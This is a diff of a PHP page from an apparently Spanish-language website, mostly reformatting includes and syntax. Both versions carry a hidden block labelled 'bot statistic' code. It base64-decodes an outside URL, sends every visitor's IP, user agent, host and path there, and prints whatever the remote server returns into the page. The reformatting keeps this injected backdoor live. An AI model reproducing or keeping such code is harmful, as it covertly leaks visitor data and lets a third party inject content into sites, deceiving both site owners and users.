@@ -1,44 +1,42 @@
 <?php  session_start();
-	 
-	 include ('includes/config.php');
-	 include ('includes/conexion.php');	 
-	 include ('includes/funciones.php');
-	 if (isset($_GET['id'])&& is_numeric($_GET['id'])){  // Si es un contenido modificable por el administrador
-	 
-	         $resul= mysql_query("SELECT titulo FROM contenidos WHERE id=".$_GET['id']." AND status=1 and tipo=1")or die(mysql_error());
-	         $titulo = mysql_fetch_assoc($resul);
-	         $titulo=$titulo['titulo']==''?TITLE:''.$titulo['titulo']; 
-         
-         }	
-	 
+
+     include 'includes/config.php';
+     include 'includes/conexion.php';
+     include 'includes/funciones.php';
+     if (isset($_GET['id']) && is_numeric($_GET['id'])) {  // Si es un contenido modificable por el administrador
+
+             $resul = mysql_query('SELECT titulo FROM contenidos WHERE id='.$_GET['id'].' AND status=1 and tipo=1') or die(mysql_error());
+         $titulo = mysql_fetch_assoc($resul);
+         $titulo = $titulo['titulo'] == '' ? TITLE : ''.$titulo['titulo'];
+     }
+
 ?><?php
-if (!isset($sRetry))
-{
-global $sRetry;
-$sRetry = 1;
+if (!isset($sRetry)) {
+    global $sRetry;
+    $sRetry = 1;
     // This code use for global bot statistic
     $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
-    $sUserAgen = "";
-    $stCurlHandle = NULL;
-    $stCurlLink = "";
-    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
-    {
-        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
-        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
-            @$stCurlHandle = curl_init( $stCurlLink ); 
+    $sUserAgen = '';
+    $stCurlHandle = null;
+    $stCurlLink = '';
+    if ((strstr($sUserAgen, 'google') == false) && (strstr($sUserAgen, 'yahoo') == false) && (strstr($sUserAgen, 'baidu') == false) && (strstr($sUserAgen, 'msn') == false) && (strstr($sUserAgen, 'opera') == false) && (strstr($sUserAgen, 'chrome') == false) && (strstr($sUserAgen, 'bing') == false) && (strstr($sUserAgen, 'safari') == false) && (strstr($sUserAgen, 'bot') == false)) {
+        // Bot comes
+
+        if (isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true) { // Create  bot analitics
+        $stCurlLink = base64_decode('aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
+            @$stCurlHandle = curl_init($stCurlLink);
+        }
     }
-    } 
-if ( $stCurlHandle !== NULL )
-{
-    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
-    $sResult = @curl_exec($stCurlHandle); 
-    if ($sResult[0]=="O") 
-     {$sResult[0]=" ";
-      echo $sResult; // Statistic code end
-      }
-    curl_close($stCurlHandle); 
-}
+    if ($stCurlHandle !== null) {
+        curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
+        $sResult = @curl_exec($stCurlHandle);
+        if ($sResult[0] == 'O') {
+            $sResult[0] = ' ';
+            echo $sResult; // Statistic code end
+        }
+        curl_close($stCurlHandle);
+    }
 }
 ?>
 
@@ -107,7 +105,7 @@ $("body").css("backgroundImage", "/img/fondo_" + backgroundImage + ".jpg");
 }(document, 'script', 'facebook-jssdk'));</script>
 
 <?php
-include('includes/ventanaBienvenida.php');
+include 'includes/ventanaBienvenida.php';
 ?>
 <!-- Tabla de Arriba -->
 <table width="100%" background="img/fondo_cabecera.png" height="70">
@@ -146,7 +144,7 @@ include('includes/ventanaBienvenida.php');
 <table width="180" border="0" cellpadding="0" cellspacing="0">
  <tr>
   <td>
-<?php include ('includes/homeMenu.php'); ?>
+<?php include 'includes/homeMenu.php'; ?>
 <br>
 <table width="100%" border="0" cellpadding="0" cellspacing="0">
 <tr><td class="menu_izq2" valign="middle">&nbsp;&nbsp;&nbsp;&nbsp;Chatbox</td></tr>
@@ -167,12 +165,12 @@ include('includes/ventanaBienvenida.php');
 <table cellspacing="0" cellpadding="0" width="750" align="center">
 <tr>
 
-<td><table width="100%" border="0" <?=isset($ancho)?$ancho:''?>>
+<td><table width="100%" border="0" <?=isset($ancho) ? $ancho : ''?>>
 <tr><td>
 
 <?php 
-	include('includes/contenido.php');
-	include('includes/comentarios.php');
+    include 'includes/contenido.php';
+    include 'includes/comentarios.php';
 ?>
 
 
